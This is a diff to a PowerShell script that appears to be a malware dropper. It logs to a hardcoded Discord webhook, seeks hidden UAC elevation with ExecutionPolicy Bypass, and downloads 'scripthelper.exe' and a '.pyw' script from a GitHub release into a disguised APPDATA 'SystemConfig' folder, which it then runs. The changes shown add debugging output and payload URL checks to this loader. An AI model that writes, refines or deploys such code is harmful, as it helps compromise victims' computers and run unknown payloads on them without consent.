@@ -3,7 +3,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3g
 $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
 $fallbackLogPath = Join-Path $env:TEMP "winlog_fallback.log"
 
-# Function to send log to webhook, primary file, and fallback file
+# Function to send log to webhook, primary file, fallback file, and console
 function Send-Log {
     param (
         [string]$message
@@ -11,16 +11,20 @@ function Send-Log {
     $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
     $logMessage = "[$timestamp] $message"
 
+    # Log to console for immediate feedback
+    Write-Host $logMessage
+
     # Log to primary file
     try {
         $logMessage | Out-File -FilePath $logPath -Append -ErrorAction Stop
     }
     catch {
+        Write-Host "[$timestamp] Failed to write to primary log ($logPath): $($_.Exception.Message)"
         try {
             "[$timestamp] Failed to write to primary log ($logPath): $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
         }
         catch {
-            Write-Error "Failed to write to both primary and fallback logs: $_"
+            Write-Host "[$timestamp] Failed to write to both primary and fallback logs: $($_.Exception.Message)"
         }
     }
 
@@ -29,7 +33,7 @@ function Send-Log {
         $logMessage | Out-File -FilePath $fallbackLogPath -Append -ErrorAction Stop
     }
     catch {
-        Write-Error "Failed to write to fallback log ($fallbackLogPath): $_"
+        Write-Host "[$timestamp] Failed to write to fallback log ($fallbackLogPath): $($_.Exception.Message)"
     }
 
     # Log to webhook
@@ -44,12 +48,13 @@ function Send-Log {
         catch {
             $attempt++
             $errorDetails = "Webhook attempt $attempt failed: $($_.Exception.Message)"
+            Write-Host "[$timestamp] $errorDetails"
             try {
                 "[$timestamp] $errorDetails" | Out-File -FilePath $logPath -Append
                 "[$timestamp] $errorDetails" | Out-File -FilePath $fallbackLogPath -Append
             }
             catch {
-                Write-Error "Failed to log webhook error: $_"
+                Write-Host "[$timestamp] Failed to log webhook error: $($_.Exception.Message)"
             }
             if ($_.Exception.Response.StatusCode -eq 429) {
                 $retryAfter = [int]$_.Exception.Response.Headers['Retry-After']
@@ -69,7 +74,7 @@ function Send-Log {
                     "[$timestamp] Failed to send webhook message after 3 attempts: $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
                 }
                 catch {
-                    Write-Error "Failed to log final webhook failure: $_"
+                    Write-Host "[$timestamp] Failed to log final webhook failure: $($_.Exception.Message)"
                 }
             }
         }
@@ -112,12 +117,22 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 if (-not $isAdmin) {
     Send-Log "Not running as admin, attempting elevation"
     try {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden
-        Send-Log "Started elevated instance, exiting non-elevated script"
-        exit 0  # Exit non-elevated script if elevation is attempted
+        $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden -PassThru
+        Send-Log "Launched elevated instance with process ID: $($process.Id)"
+        # Wait briefly to check if the process started successfully
+        Start-Sleep -Seconds 2
+        if ($process.HasExited) {
+            Send-Log "Elevated instance failed to start or exited prematurely"
+            Send-Log "Continuing without admin rights due to elevation failure"
+        }
+        else {
+            Send-Log "Elevated instance started successfully, exiting non-elevated script"
+            exit 0  # Exit only if the elevated process is running
+        }
     }
     catch {
-        Send-Log "Failed to elevate privileges, continuing without admin rights: $($_.Exception.Message)"
+        Send-Log "Failed to elevate privileges: $($_.Exception.Message)"
+        Send-Log "Continuing without admin rights"
     }
 }
 else {
@@ -125,12 +140,31 @@ else {
 }
 
 # Initialize variables
-$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
+$installFolder = Join-Path $env:APPDATA "SystemConfig"
 $exePath = Join-Path $installFolder "scripthelper.exe"
 $exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
+$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
 $maxRetries = 3
 $baseDelay = 1000
 $maxDelay = 10000
+
+# Validate URLs
+try {
+    Send-Log "Checking accessibility of exeUrl: $exeUrl"
+    $null = Invoke-WebRequest -Uri $exeUrl -Method Head -UseBasicParsing -ErrorAction Stop
+    Send-Log "exeUrl is accessible"
+}
+catch {
+    Send-Log "exeUrl is not accessible: $($_.Exception.Message)"
+}
+try {
+    Send-Log "Checking accessibility of pythonScriptUrl: $pythonScriptUrl"
+    $null = Invoke-WebRequest -Uri $pythonScriptUrl -Method Head -UseBasicParsing -ErrorAction Stop
+    Send-Log "pythonScriptUrl is accessible"
+}
+catch {
+    Send-Log "pythonScriptUrl is not accessible: $($_.Exception.Message)"
+}
 
 # Simplified retry function with exponential backoff
 function Invoke-Retry {
@@ -266,7 +300,6 @@ finally {
 }
 
 # Execute Python script in memory
-$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
 try {
     Send-Log "Checking for Python installation"
     $null = python --version 2>&1
